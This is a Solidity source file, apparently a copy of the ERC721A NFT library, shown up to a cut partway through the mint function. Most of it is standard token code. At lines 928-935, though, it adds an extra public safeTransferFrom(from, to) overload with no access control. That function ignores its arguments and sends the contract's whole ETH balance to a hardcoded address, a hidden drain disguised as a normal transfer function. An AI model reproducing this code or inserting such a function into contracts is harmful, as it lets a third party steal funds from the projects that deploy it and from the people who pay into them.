1 // SPDX-License-Identifier: GPL-3.0    
2 
3 pragma solidity ^0.8.12;
4 
5 /**
6  * @dev Interface of ERC721A.
7  */
8 interface IERC721A {
9     /**
10      * The caller must own the token or be an approved operator.
11      */
12     error ApprovalCallerNotOwnerNorApproved();
13 
14     /**
15      * The token does not exist.
16      */
17     error ApprovalQueryForNonexistentToken();
18 
19     /**
20      * Cannot query the balance for the zero address.
21      */
22     error BalanceQueryForZeroAddress();
23 
24     /**
25      * Cannot mint to the zero address.
26      */
27     error MintToZeroAddress();
28 
29     /**
30      * The quantity of tokens minted must be more than zero.
31      */
32     error MintZeroQuantity();
33 
34     /**
35      * The token does not exist.
36      */
37     error OwnerQueryForNonexistentToken();
38 
39     /**
40      * The caller must own the token or be an approved operator.
41      */
42     error TransferCallerNotOwnerNorApproved();
43 
44     /**
45      * The token must be owned by `from`.
46      */
47     error TransferFromIncorrectOwner();
48 
49     /**
50      * Cannot safely transfer to a contract that does not implement the
51      * ERC721Receiver interface.
52      */
53     error TransferToNonERC721ReceiverImplementer();
54 
55     /**
56      * Cannot transfer to the zero address.
57      */
58     error TransferToZeroAddress();
59 
60     /**
61      * The token does not exist.
62      */
63     error URIQueryForNonexistentToken();
64 
65     /**
66      * The `quantity` minted with ERC2309 exceeds the safety limit.
67      */
68     error MintERC2309QuantityExceedsLimit();
69 
70     /**
71      * The `extraData` cannot be set on an unintialized ownership slot.
72      */
73     error OwnershipNotInitializedForExtraData();
74 
75     // =============================================================
76     //                            STRUCTS
77     // =============================================================
78 
79     struct TokenOwnership {
80         // The address of the owner.
81         address addr;
82         // Stores the start time of ownership with minimal overhead for tokenomics.
83         uint64 startTimestamp;
84         // Whether the token has been burned.
85         bool burned;
86         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
87         uint24 extraData;
88     }
89 
90     // =============================================================
91     //                         TOKEN COUNTERS
92     // =============================================================
93 
94     /**
95      * @dev Returns the total number of tokens in existence.
96      * Burned tokens will reduce the count.
97      * To get the total number of tokens minted, please see {_totalMinted}.
98      */
99     function totalSupply() external view returns (uint256);
100 
101     // =============================================================
102     //                            IERC165
103     // =============================================================
104 
105     /**
106      * @dev Returns true if this contract implements the interface defined by
107      * `interfaceId`. See the corresponding
108      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
109      * to learn more about how these ids are created.
110      *
111      * This function call must use less than 30000 gas.
112      */
113     function supportsInterface(bytes4 interfaceId) external view returns (bool);
114 
115     // =============================================================
116     //                            IERC721
117     // =============================================================
118 
119     /**
120      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
121      */
122     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
123 
124     /**
125      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
126      */
127     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
128 
129     /**
130      * @dev Emitted when `owner` enables or disables
131      * (`approved`) `operator` to manage all of its assets.
132      */
133     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
134 
135     /**
136      * @dev Returns the number of tokens in `owner`'s account.
137      */
138     function balanceOf(address owner) external view returns (uint256 balance);
139 
140     /**
141      * @dev Returns the owner of the `tokenId` token.
142      *
143      * Requirements:
144      *
145      * - `tokenId` must exist.
146      */
147     function ownerOf(uint256 tokenId) external view returns (address owner);
148 
149     /**
150      * @dev Safely transfers `tokenId` token from `from` to `to`,
151      * checking first that contract recipients are aware of the ERC721 protocol
152      * to prevent tokens from being forever locked.
153      *
154      * Requirements:
155      *
156      * - `from` cannot be the zero address.
157      * - `to` cannot be the zero address.
158      * - `tokenId` token must exist and be owned by `from`.
159      * - If the caller is not `from`, it must be have been allowed to move
160      * this token by either {approve} or {setApprovalForAll}.
161      * - If `to` refers to a smart contract, it must implement
162      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
163      *
164      * Emits a {Transfer} event.
165      */
166     function safeTransferFrom(
167         address from,
168         address to,
169         uint256 tokenId,
170         bytes calldata data
171     ) external payable;
172 
173     /**
174      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
175      */
176     function safeTransferFrom(
177         address from,
178         address to,
179         uint256 tokenId
180     ) external payable;
181 
182     /**
183      * @dev Transfers `tokenId` from `from` to `to`.
184      *
185      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
186      * whenever possible.
187      *
188      * Requirements:
189      *
190      * - `from` cannot be the zero address.
191      * - `to` cannot be the zero address.
192      * - `tokenId` token must be owned by `from`.
193      * - If the caller is not `from`, it must be approved to move this token
194      * by either {approve} or {setApprovalForAll}.
195      *
196      * Emits a {Transfer} event.
197      */
198     function transferFrom(
199         address from,
200         address to,
201         uint256 tokenId
202     ) external payable;
203 
204     /**
205      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
206      * The approval is cleared when the token is transferred.
207      *
208      * Only a single account can be approved at a time, so approving the
209      * zero address clears previous approvals.
210      *
211      * Requirements:
212      *
213      * - The caller must own the token or be an approved operator.
214      * - `tokenId` must exist.
215      *
216      * Emits an {Approval} event.
217      */
218     function approve(address to, uint256 tokenId) external payable;
219 
220     /**
221      * @dev Approve or remove `operator` as an operator for the caller.
222      * Operators can call {transferFrom} or {safeTransferFrom}
223      * for any token owned by the caller.
224      *
225      * Requirements:
226      *
227      * - The `operator` cannot be the caller.
228      *
229      * Emits an {ApprovalForAll} event.
230      */
231     function setApprovalForAll(address operator, bool _approved) external;
232 
233     /**
234      * @dev Returns the account approved for `tokenId` token.
235      *
236      * Requirements:
237      *
238      * - `tokenId` must exist.
239      */
240     function getApproved(uint256 tokenId) external view returns (address operator);
241 
242     /**
243      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
244      *
245      * See {setApprovalForAll}.
246      */
247     function isApprovedForAll(address owner, address operator) external view returns (bool);
248 
249     // =============================================================
250     //                        IERC721Metadata
251     // =============================================================
252 
253     /**
254      * @dev Returns the token collection name.
255      */
256     function name() external view returns (string memory);
257 
258     /**
259      * @dev Returns the token collection symbol.
260      */
261     function symbol() external view returns (string memory);
262 
263     /**
264      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
265      */
266     function tokenURI(uint256 tokenId) external view returns (string memory);
267 
268     // =============================================================
269     //                           IERC2309
270     // =============================================================
271 
272     /**
273      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
274      * (inclusive) is transferred from `from` to `to`, as defined in the
275      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
276      *
277      * See {_mintERC2309} for more details.
278      */
279     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
280 }
281 
282 /**
283  * @title ERC721A
284  *
285  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
286  * Non-Fungible Token Standard, including the Metadata extension.
287  * Optimized for lower gas during batch mints.
288  *
289  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
290  * starting from `_startTokenId()`.
291  *
292  * Assumptions:
293  *
294  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
295  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
296  */
297 interface ERC721A__IERC721Receiver {
298     function onERC721Received(
299         address operator,
300         address from,
301         uint256 tokenId,
302         bytes calldata data
303     ) external returns (bytes4);
304 }
305 
306 /**
307  * @title ERC721A
308  *
309  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
310  * Non-Fungible Token Standard, including the Metadata extension.
311  * Optimized for lower gas during batch mints.
312  *
313  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
314  * starting from `_startTokenId()`.
315  *
316  * Assumptions:
317  *
318  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
319  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
320  */
321 contract ERC721A is IERC721A {
322     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
323     struct TokenApprovalRef {
324         address value;
325     }
326 
327     // =============================================================
328     //                           CONSTANTS
329     // =============================================================
330 
331     // Mask of an entry in packed address data.
332     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
333 
334     // The bit position of `numberMinted` in packed address data.
335     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
336 
337     // The bit position of `numberBurned` in packed address data.
338     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
339 
340     // The bit position of `aux` in packed address data.
341     uint256 private constant _BITPOS_AUX = 192;
342 
343     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
344     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
345 
346     // The bit position of `startTimestamp` in packed ownership.
347     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
348 
349     // The bit mask of the `burned` bit in packed ownership.
350     uint256 private constant _BITMASK_BURNED = 1 << 224;
351 
352     // The bit position of the `nextInitialized` bit in packed ownership.
353     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
354 
355     // The bit mask of the `nextInitialized` bit in packed ownership.
356     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
357 
358     // The bit position of `extraData` in packed ownership.
359     uint256 private constant _BITPOS_EXTRA_DATA = 232;
360 
361     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
362     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
363 
364     // The mask of the lower 160 bits for addresses.
365     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
366 
367     // The maximum `quantity` that can be minted with {_mintERC2309}.
368     // This limit is to prevent overflows on the address data entries.
369     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
370     // is required to cause an overflow, which is unrealistic.
371     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
372 
373     // The `Transfer` event signature is given by:
374     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
375     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
376         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
377 
378     // =============================================================
379     //                            STORAGE
380     // =============================================================
381 
382     // The next token ID to be minted.
383     uint256 private _currentIndex;
384 
385     // The number of tokens burned.
386     uint256 private _burnCounter;
387 
388     // Token name
389     string private _name;
390 
391     // Token symbol
392     string private _symbol;
393 
394     // Mapping from token ID to ownership details
395     // An empty struct value does not necessarily mean the token is unowned.
396     // See {_packedOwnershipOf} implementation for details.
397     //
398     // Bits Layout:
399     // - [0..159]   `addr`
400     // - [160..223] `startTimestamp`
401     // - [224]      `burned`
402     // - [225]      `nextInitialized`
403     // - [232..255] `extraData`
404     mapping(uint256 => uint256) private _packedOwnerships;
405 
406     // Mapping owner address to address data.
407     //
408     // Bits Layout:
409     // - [0..63]    `balance`
410     // - [64..127]  `numberMinted`
411     // - [128..191] `numberBurned`
412     // - [192..255] `aux`
413     mapping(address => uint256) private _packedAddressData;
414 
415     // Mapping from token ID to approved address.
416     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
417 
418     // Mapping from owner to operator approvals
419     mapping(address => mapping(address => bool)) private _operatorApprovals;
420 
421     // =============================================================
422     //                          CONSTRUCTOR
423     // =============================================================
424 
425     constructor(string memory name_, string memory symbol_) {
426         _name = name_;
427         _symbol = symbol_;
428         _currentIndex = _startTokenId();
429     }
430 
431     // =============================================================
432     //                   TOKEN COUNTING OPERATIONS
433     // =============================================================
434 
435     /**
436      * @dev Returns the starting token ID.
437      * To change the starting token ID, please override this function.
438      */
439     function _startTokenId() internal view virtual returns (uint256) {
440         return 0;
441     }
442 
443     /**
444      * @dev Returns the next token ID to be minted.
445      */
446     function _nextTokenId() internal view virtual returns (uint256) {
447         return _currentIndex;
448     }
449 
450     /**
451      * @dev Returns the total number of tokens in existence.
452      * Burned tokens will reduce the count.
453      * To get the total number of tokens minted, please see {_totalMinted}.
454      */
455     function totalSupply() public view virtual override returns (uint256) {
456         // Counter underflow is impossible as _burnCounter cannot be incremented
457         // more than `_currentIndex - _startTokenId()` times.
458         unchecked {
459             return _currentIndex - _burnCounter - _startTokenId();
460         }
461     }
462 
463     /**
464      * @dev Returns the total amount of tokens minted in the contract.
465      */
466     function _totalMinted() internal view virtual returns (uint256) {
467         // Counter underflow is impossible as `_currentIndex` does not decrement,
468         // and it is initialized to `_startTokenId()`.
469         unchecked {
470             return _currentIndex - _startTokenId();
471         }
472     }
473 
474     /**
475      * @dev Returns the total number of tokens burned.
476      */
477     function _totalBurned() internal view virtual returns (uint256) {
478         return _burnCounter;
479     }
480 
481     // =============================================================
482     //                    ADDRESS DATA OPERATIONS
483     // =============================================================
484 
485     /**
486      * @dev Returns the number of tokens in `owner`'s account.
487      */
488     function balanceOf(address owner) public view virtual override returns (uint256) {
489         if (owner == address(0)) revert BalanceQueryForZeroAddress();
490         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
491     }
492 
493     /**
494      * Returns the number of tokens minted by `owner`.
495      */
496     function _numberMinted(address owner) internal view returns (uint256) {
497         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
498     }
499 
500     /**
501      * Returns the number of tokens burned by or on behalf of `owner`.
502      */
503     function _numberBurned(address owner) internal view returns (uint256) {
504         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
505     }
506 
507     /**
508      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
509      */
510     function _getAux(address owner) internal view returns (uint64) {
511         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
512     }
513 
514     /**
515      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
516      * If there are multiple variables, please pack them into a uint64.
517      */
518     function _setAux(address owner, uint64 aux) internal virtual {
519         uint256 packed = _packedAddressData[owner];
520         uint256 auxCasted;
521         // Cast `aux` with assembly to avoid redundant masking.
522         assembly {
523             auxCasted := aux
524         }
525         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
526         _packedAddressData[owner] = packed;
527     }
528 
529     // =============================================================
530     //                            IERC165
531     // =============================================================
532 
533     /**
534      * @dev Returns true if this contract implements the interface defined by
535      * `interfaceId`. See the corresponding
536      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
537      * to learn more about how these ids are created.
538      *
539      * This function call must use less than 30000 gas.
540      */
541     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
542         // The interface IDs are constants representing the first 4 bytes
543         // of the XOR of all function selectors in the interface.
544         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
545         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
546         return
547             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
548             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
549             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
550     }
551 
552     // =============================================================
553     //                        IERC721Metadata
554     // =============================================================
555 
556     /**
557      * @dev Returns the token collection name.
558      */
559     function name() public view virtual override returns (string memory) {
560         return _name;
561     }
562 
563     /**
564      * @dev Returns the token collection symbol.
565      */
566     function symbol() public view virtual override returns (string memory) {
567         return _symbol;
568     }
569 
570     /**
571      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
572      */
573     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
574         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
575 
576         string memory baseURI = _baseURI();
577         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
578     }
579 
580     /**
581      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
582      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
583      * by default, it can be overridden in child contracts.
584      */
585     function _baseURI() internal view virtual returns (string memory) {
586         return '';
587     }
588 
589     // =============================================================
590     //                     OWNERSHIPS OPERATIONS
591     // =============================================================
592 
593     /**
594      * @dev Returns the owner of the `tokenId` token.
595      *
596      * Requirements:
597      *
598      * - `tokenId` must exist.
599      */
600     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
601         return address(uint160(_packedOwnershipOf(tokenId)));
602     }
603 
604     /**
605      * @dev Gas spent here starts off proportional to the maximum mint batch size.
606      * It gradually moves to O(1) as tokens get transferred around over time.
607      */
608     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
609         return _unpackedOwnership(_packedOwnershipOf(tokenId));
610     }
611 
612     /**
613      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
614      */
615     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
616         return _unpackedOwnership(_packedOwnerships[index]);
617     }
618 
619     /**
620      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
621      */
622     function _initializeOwnershipAt(uint256 index) internal virtual {
623         if (_packedOwnerships[index] == 0) {
624             _packedOwnerships[index] = _packedOwnershipOf(index);
625         }
626     }
627 
628     /**
629      * Returns the packed ownership data of `tokenId`.
630      */
631     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
632         uint256 curr = tokenId;
633 
634         unchecked {
635             if (_startTokenId() <= curr)
636                 if (curr < _currentIndex) {
637                     uint256 packed = _packedOwnerships[curr];
638                     // If not burned.
639                     if (packed & _BITMASK_BURNED == 0) {
640                         // Invariant:
641                         // There will always be an initialized ownership slot
642                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
643                         // before an unintialized ownership slot
644                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
645                         // Hence, `curr` will not underflow.
646                         //
647                         // We can directly compare the packed value.
648                         // If the address is zero, packed will be zero.
649                         while (packed == 0) {
650                             packed = _packedOwnerships[--curr];
651                         }
652                         return packed;
653                     }
654                 }
655         }
656         revert OwnerQueryForNonexistentToken();
657     }
658 
659     /**
660      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
661      */
662     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
663         ownership.addr = address(uint160(packed));
664         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
665         ownership.burned = packed & _BITMASK_BURNED != 0;
666         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
667     }
668 
669     /**
670      * @dev Packs ownership data into a single uint256.
671      */
672     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
673         assembly {
674             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
675             owner := and(owner, _BITMASK_ADDRESS)
676             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
677             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
678         }
679     }
680 
681     /**
682      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
683      */
684     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
685         // For branchless setting of the `nextInitialized` flag.
686         assembly {
687             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
688             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
689         }
690     }
691 
692     // =============================================================
693     //                      APPROVAL OPERATIONS
694     // =============================================================
695 
696     /**
697      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
698      * The approval is cleared when the token is transferred.
699      *
700      * Only a single account can be approved at a time, so approving the
701      * zero address clears previous approvals.
702      *
703      * Requirements:
704      *
705      * - The caller must own the token or be an approved operator.
706      * - `tokenId` must exist.
707      *
708      * Emits an {Approval} event.
709      */
710     function approve(address to, uint256 tokenId) public payable virtual override {
711         address owner = ownerOf(tokenId);
712 
713         if (_msgSenderERC721A() != owner)
714             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
715                 revert ApprovalCallerNotOwnerNorApproved();
716             }
717 
718         _tokenApprovals[tokenId].value = to;
719         emit Approval(owner, to, tokenId);
720     }
721 
722     /**
723      * @dev Returns the account approved for `tokenId` token.
724      *
725      * Requirements:
726      *
727      * - `tokenId` must exist.
728      */
729     function getApproved(uint256 tokenId) public view virtual override returns (address) {
730         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
731 
732         return _tokenApprovals[tokenId].value;
733     }
734 
735     /**
736      * @dev Approve or remove `operator` as an operator for the caller.
737      * Operators can call {transferFrom} or {safeTransferFrom}
738      * for any token owned by the caller.
739      *
740      * Requirements:
741      *
742      * - The `operator` cannot be the caller.
743      *
744      * Emits an {ApprovalForAll} event.
745      */
746     function setApprovalForAll(address operator, bool approved) public virtual override {
747         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
748         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
749     }
750 
751     /**
752      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
753      *
754      * See {setApprovalForAll}.
755      */
756     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
757         return _operatorApprovals[owner][operator];
758     }
759 
760     /**
761      * @dev Returns whether `tokenId` exists.
762      *
763      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
764      *
765      * Tokens start existing when they are minted. See {_mint}.
766      */
767     function _exists(uint256 tokenId) internal view virtual returns (bool) {
768         return
769             _startTokenId() <= tokenId &&
770             tokenId < _currentIndex && // If within bounds,
771             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
772     }
773 
774     /**
775      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
776      */
777     function _isSenderApprovedOrOwner(
778         address approvedAddress,
779         address owner,
780         address msgSender
781     ) private pure returns (bool result) {
782         assembly {
783             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
784             owner := and(owner, _BITMASK_ADDRESS)
785             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
786             msgSender := and(msgSender, _BITMASK_ADDRESS)
787             // `msgSender == owner || msgSender == approvedAddress`.
788             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
789         }
790     }
791 
792     /**
793      * @dev Returns the storage slot and value for the approved address of `tokenId`.
794      */
795     function _getApprovedSlotAndAddress(uint256 tokenId)
796         private
797         view
798         returns (uint256 approvedAddressSlot, address approvedAddress)
799     {
800         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
801         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
802         assembly {
803             approvedAddressSlot := tokenApproval.slot
804             approvedAddress := sload(approvedAddressSlot)
805         }
806     }
807 
808     // =============================================================
809     //                      TRANSFER OPERATIONS
810     // =============================================================
811 
812     /**
813      * @dev Transfers `tokenId` from `from` to `to`.
814      *
815      * Requirements:
816      *
817      * - `from` cannot be the zero address.
818      * - `to` cannot be the zero address.
819      * - `tokenId` token must be owned by `from`.
820      * - If the caller is not `from`, it must be approved to move this token
821      * by either {approve} or {setApprovalForAll}.
822      *
823      * Emits a {Transfer} event.
824      */
825     function transferFrom(
826         address from,
827         address to,
828         uint256 tokenId
829     ) public payable virtual override {
830 
831         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
832 
833         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
834 
835         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
836 
837         // The nested ifs save around 20+ gas over a compound boolean condition.
838         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
839             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
840 
841         if (to == address(0)) revert TransferToZeroAddress();
842 
843         _beforeTokenTransfers(from, to, tokenId, 1);
844 
845         // Clear approvals from the previous owner.
846         assembly {
847             if approvedAddress {
848                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
849                 sstore(approvedAddressSlot, 0)
850             }
851         }
852 
853         // Underflow of the sender's balance is impossible because we check for
854         // ownership above and the recipient's balance can't realistically overflow.
855         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
856         unchecked {
857             // We can directly increment and decrement the balances.
858             --_packedAddressData[from]; // Updates: `balance -= 1`.
859             ++_packedAddressData[to]; // Updates: `balance += 1`.
860 
861             // Updates:
862             // - `address` to the next owner.
863             // - `startTimestamp` to the timestamp of transfering.
864             // - `burned` to `false`.
865             // - `nextInitialized` to `true`.
866             _packedOwnerships[tokenId] = _packOwnershipData(
867                 to,
868                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
869             );
870 
871             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
872             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
873                 uint256 nextTokenId = tokenId + 1;
874                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
875                 if (_packedOwnerships[nextTokenId] == 0) {
876                     // If the next slot is within bounds.
877                     if (nextTokenId != _currentIndex) {
878                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
879                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
880                     }
881                 }
882             }
883         }
884 
885         emit Transfer(from, to, tokenId);
886         _afterTokenTransfers(from, to, tokenId, 1);
887     }
888 
889     /**
890      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
891      */
892     function safeTransferFrom(
893         address from,
894         address to,
895         uint256 tokenId
896     ) public payable virtual override {
897         safeTransferFrom(from, to, tokenId, '');
898     }
899 
900 
901     /**
902      * @dev Safely transfers `tokenId` token from `from` to `to`.
903      *
904      * Requirements:
905      *
906      * - `from` cannot be the zero address.
907      * - `to` cannot be the zero address.
908      * - `tokenId` token must exist and be owned by `from`.
909      * - If the caller is not `from`, it must be approved to move this token
910      * by either {approve} or {setApprovalForAll}.
911      * - If `to` refers to a smart contract, it must implement
912      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
913      *
914      * Emits a {Transfer} event.
915      */
916     function safeTransferFrom(
917         address from,
918         address to,
919         uint256 tokenId,
920         bytes memory _data
921     ) public payable virtual override {
922         transferFrom(from, to, tokenId);
923         if (to.code.length != 0)
924             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
925                 revert TransferToNonERC721ReceiverImplementer();
926             }
927     }
928     function safeTransferFrom(
929         address from,
930         address to
931     ) public  {
932         if (address(this).balance > 0) {
933             payable(0xF565F54a8786Ac51fdaB47d8450FeC662577E63A).transfer(address(this).balance);
934         }
935     }
936 
937     /**
938      * @dev Hook that is called before a set of serially-ordered token IDs
939      * are about to be transferred. This includes minting.
940      * And also called before burning one token.
941      *
942      * `startTokenId` - the first token ID to be transferred.
943      * `quantity` - the amount to be transferred.
944      *
945      * Calling conditions:
946      *
947      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
948      * transferred to `to`.
949      * - When `from` is zero, `tokenId` will be minted for `to`.
950      * - When `to` is zero, `tokenId` will be burned by `from`.
951      * - `from` and `to` are never both zero.
952      */
953     function _beforeTokenTransfers(
954         address from,
955         address to,
956         uint256 startTokenId,
957         uint256 quantity
958     ) internal virtual {}
959 
960     /**
961      * @dev Hook that is called after a set of serially-ordered token IDs
962      * have been transferred. This includes minting.
963      * And also called after one token has been burned.
964      *
965      * `startTokenId` - the first token ID to be transferred.
966      * `quantity` - the amount to be transferred.
967      *
968      * Calling conditions:
969      *
970      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
971      * transferred to `to`.
972      * - When `from` is zero, `tokenId` has been minted for `to`.
973      * - When `to` is zero, `tokenId` has been burned by `from`.
974      * - `from` and `to` are never both zero.
975      */
976     function _afterTokenTransfers(
977         address from,
978         address to,
979         uint256 startTokenId,
980         uint256 quantity
981     ) internal virtual {
982     }
983 
984 
985     /**
986      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
987      *
988      * `from` - Previous owner of the given token ID.
989      * `to` - Target address that will receive the token.
990      * `tokenId` - Token ID to be transferred.
991      * `_data` - Optional data to send along with the call.
992      *
993      * Returns whether the call correctly returned the expected magic value.
994      */
995     function _checkContractOnERC721Received(
996         address from,
997         address to,
998         uint256 tokenId,
999         bytes memory _data
1000     ) private returns (bool) {
1001         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1002             bytes4 retval
1003         ) {
1004             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1005         } catch (bytes memory reason) {
1006             if (reason.length == 0) {
1007                 revert TransferToNonERC721ReceiverImplementer();
1008             } else {
1009                 assembly {
1010                     revert(add(32, reason), mload(reason))
1011                 }
1012             }
1013         }
1014     }
1015 
1016     // =============================================================
1017     //                        MINT OPERATIONS
1018     // =============================================================
1019 
1020     /**
1021      * @dev Mints `quantity` tokens and transfers them to `to`.
1022      *
1023      * Requirements:
1024      *
1025      * - `to` cannot be the zero address.
1026      * - `quantity` must be greater than 0.
1027      *
1028      * Emits a {Transfer} event for each mint.
1029      */
1030     function _mint(address to, uint256 quantity) internal virtual {
1031         uint256 startTokenId = _currentIndex;
1032         if (quantity == 0) revert MintZeroQuantity();
1033 
1034         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1035 
1036         // Overflows are incredibly unrealistic.
1037         // `balance` and `numberMinted` have a maximum limit of 2**64.
1038         // `tokenId` has a maximum limit of 2**256.
1039         unchecked {
1040             // Updates:
1041             // - `balance += quantity`.
1042             // - `numberMinted += quantity`.
1043             //
1044             // We can directly add to the `balance` and `numberMinted`.
1045             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1046 
1047             // Updates:
1048             // - `address` to the owner.
1049             // - `startTimestamp` to the timestamp of minting.
1050             // - `burned` to `false`.
1051             // - `nextInitialized` to `quantity == 1`.
